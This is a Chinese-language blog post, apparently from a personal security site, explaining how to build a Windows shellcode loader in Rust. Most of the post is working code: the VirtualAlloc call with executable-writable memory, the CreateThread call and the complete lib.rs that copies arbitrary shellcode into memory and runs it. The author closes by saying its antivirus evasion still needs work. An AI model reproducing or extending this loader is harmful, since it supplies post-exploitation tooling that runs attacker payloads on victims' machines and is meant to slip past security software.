<!DOCTYPE html>
<html lang="en"><head>
    <title>HUGO.386</title>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no" />
    <meta name="theme-color" content="#000084" />
    <link rel="icon" href="https://fumerem.github.io/favicon.ico">
    <link rel="canonical" href="https://fumerem.github.io">
    
    
</head>
<body>
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
            <a class="brand" href="https://fumerem.github.io">HUGO.386</a>
            <div class="nav-collapse collapse">
                <ul class="nav">
                    
                    
                        
                            <li>
                                <a href="/about/">
                                    
                                    <span>About</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/posts/">
                                    
                                    <span>All posts</span>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
        </div>
    </div>
</nav><div id="content" class="container">

<div class="row-fluid navmargin">
    <div class="page-header">
        <h1>rust编写shellcode加载器 - Sun, Jun 12, 2022</h1>
    </div>
    
    <p>​	突发奇想用rust写一个shellcode加载器,花了两天研究了思路和大佬的代码.</p>
<p>项目地址:https://github.com/fumerem/shellcode_loader</p>
<h2 id="0x00-shellcode加载器原理">0x00 shellcode加载器原理</h2>
<p>shellcode:一段16进制的机器码,后渗透中经常使用它来得到shell而得名.</p>
<p>加载器原理:为shellcode分配动态内存,并创建进程执行shellcode</p>
<h2 id="0x01-加载器的编写">0x01 加载器的编写</h2>
<p>先列举一下加载器需要调用的windows的api</p>
<h3 id="vistualalloc">VistualAlloc</h3>
<blockquote>
<p>申请内存</p>
<p>LPVOID VirtualAlloc {
LPVOID lpAddress, #要分配的内存区域的地址
DWORD dwSize,      #分配的大小
DWORD flAllocationType, #分配的类型
DWORD flProtect     #该内存的初始保护属性
};</p>
</blockquote>
<p>代码实现</p>
<pre tabindex="0"><code>unsafe {
	memory.ptr = Memory::VirtualAlloc(
		ptr::null(),
		//memory address to distribute
		len,
		//memory size
		Memory::MEM_COMMIT | Memory::MEM_RESERVE,
		//alloc type
		Memory::PAGE_EXECUTE_READWRITE,
		//protect attribute
	) as *mut u8;
};
</code></pre><h3 id="createthread">CreateThread</h3>
<blockquote>
<p>创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread</p>
<p>HANDLE CreateThread (
LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性
SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位
LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针
LPVOID lpParameter,          #向线程函数传递的参数
DWORD dwCreationFlags,       #线程创建属性
LPDWORD lpThreadId           #保存新线程的id
)</p>
</blockquote>
<p>代码实现</p>
<pre tabindex="0"><code>th.handle = Threading::CreateThread(
	ptr::null_mut(),
	//thread protect attribute
	0,
	//stack attribute
	Some(ep),
	//pointer to thread func
	ptr::null_mut(),
	//prama to thread func
	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
	//thread create flags
	&amp;mut th.tid,
	//thread id
).unwrap();
</code></pre><h3 id="virtualfree">VirtualFree</h3>
<pre tabindex="0"><code>VirtualFreeEx{编辑 播报
	HANDLE hProcess, // 要释放内存所在进程的句柄
	LPVOID lpAddress, // 区域地址
	DWORD dwSize, // 区域大小，字节
	DWORD dwFreeType //类型
};
</code></pre><p>代码实现</p>
<pre tabindex="0"><code>Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
</code></pre><p>lib.rs全部代码</p>
<pre tabindex="0"><code>use std::ptr;
use std::slice;
use std::mem;
use std::ffi::c_void;
use windows::Win32::System::Memory;
use windows::Win32::Foundation;
use windows::Win32::Foundation::WIN32_ERROR;
use windows::Win32::System::Threading;
use windows::Win32::System::WindowsProgramming;

pub struct DistributeMemory {
	len: usize,
	ptr: *mut u8,
}

impl Drop for DistributeMemory {
	fn drop(&amp;mut self) {
		unsafe{
			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
		}
	}
}

impl DistributeMemory {
	fn new(len: usize) -&gt; Result&lt;DistributeMemory, WIN32_ERROR&gt; {
		let mut memory = DistributeMemory {
			len,
			ptr: ptr::null_mut(),
		};
		
		unsafe {
			memory.ptr = Memory::VirtualAlloc(
				ptr::null(),
				//memory address to distribute
				len,
				//memory size
				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
				//alloc type
				Memory::PAGE_EXECUTE_READWRITE,
				//protect attribute
			) as *mut u8;
		};
		
		if memory.ptr.is_null() {
			Err( unsafe{ Foundation::GetLastError()} )
		} else {
			Ok(memory)
		}
	}
	
	pub fn as_slice_mut(&amp;mut self) -&gt; &amp;mut[u8] {
		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
	}
	
	pub fn as_ptr(&amp;self) -&gt; *mut u8 {
		self.ptr
	}
}

pub struct Thread {
	handle: Foundation::HANDLE,
	tid: u32,
}

impl Drop for Thread {
	fn drop(&amp;mut self) {
		unsafe { Foundation::CloseHandle(self.handle) };
	}
}

impl Thread {
	pub unsafe fn run(start: *const u8) -&gt; Result&lt;Thread, WIN32_ERROR&gt; {
		let mut th = Thread {
			handle: Foundation::HANDLE(0),
			tid: 0,
		};
		
		let ep: extern &#34;system&#34; fn(*mut c_void) -&gt; u32 = { std::mem::transmute(start) };
		
		th.handle = Threading::CreateThread(
			ptr::null_mut(),
			//thread protect attribute
			0,
			//stack attribute
			Some(ep),
			//pointer to thread func
			ptr::null_mut(),
			//prama to thread func
			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
			//thread create flags
			&amp;mut th.tid,
			//thread id
		).unwrap();
		
		if th.handle == Foundation::HANDLE(0) {
			Err(Foundation::GetLastError())
		} else {
			Ok(th)
		}
	}
	
	pub fn wait(&amp;self) -&gt; Result&lt;(), WIN32_ERROR&gt; {
		let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
		if status == 0 {
			Ok(())
		} else {
			Err( unsafe{Foundation::GetLastError()} )
		}
	}
}

pub fn run(shellcode: Vec&lt;u8&gt;) -&gt; Result&lt;(), WIN32_ERROR&gt; {
	let mut me = DistributeMemory::new(shellcode.len())?;
	let ms = me.as_slice_mut();
	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
	let t = unsafe {
		Thread::run(me.as_ptr())
	}?;
	t.wait()
}
</code></pre><h2 id="0x02-存在的缺陷">0x02 存在的缺陷</h2>
<p>​	由于使用的是指定成员数量的切片,在main.rs中复制粘贴时必须改变[u8]的数量.</p>
<p>免杀功能仍须改进</p>

    <h4><a href="https://fumerem.github.io">Back to Home</a></h4>
</div>


        </div><footer class="container">
    <hr class="soften">
    <p>

    <a href="https://gitlab.com/maxlefou/hugo.386">hugo.386 theme by Max le Fou</a> | 

&copy; 
<a href="http://jmf-portfolio.netlify.com" target="_blank">
    Fumerem
</a>
<span id="thisyear">2020</span>


        | <a href="//gohugo.io" target="_blank">Hugo</a>Built on

</p>
    <p class="text-center">
        
        
        
        <a href="https://github.com">GitHub</a> 
        
    </p>
</footer>

</body><link rel="stylesheet" href="/css/bootstrap.css">
<link rel="stylesheet" href="/css/bootstrap-responsive.css">
<link rel="stylesheet" href="/css/style.css">

<script src="/js/jquery.js"></script>
<script src="/js/bootstrap-386.js"></script>
<script src="/js/bootstrap-transition.js"></script>
<script src="/js/bootstrap-alert.js"></script>
<script src="/js/bootstrap-modal.js"></script>
<script src="/js/bootstrap-dropdown.js"></script>
<script src="/js/bootstrap-scrollspy.js"></script>
<script src="/js/bootstrap-tab.js"></script>
<script src="/js/bootstrap-tooltip.js"></script>
<script src="/js/bootstrap-popover.js"></script>
<script src="/js/bootstrap-button.js"></script>
<script src="/js/bootstrap-collapse.js"></script>
<script src="/js/bootstrap-carousel.js"></script>
<script src="/js/bootstrap-typeahead.js"></script>
<script src="/js/bootstrap-affix.js"></script>
<script>
    _386 = { 
        fastLoad: false ,
        onePass: false , 
        speedFactor: 1 
    };

    
    function ThisYear() {
        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
    };
</script></html>
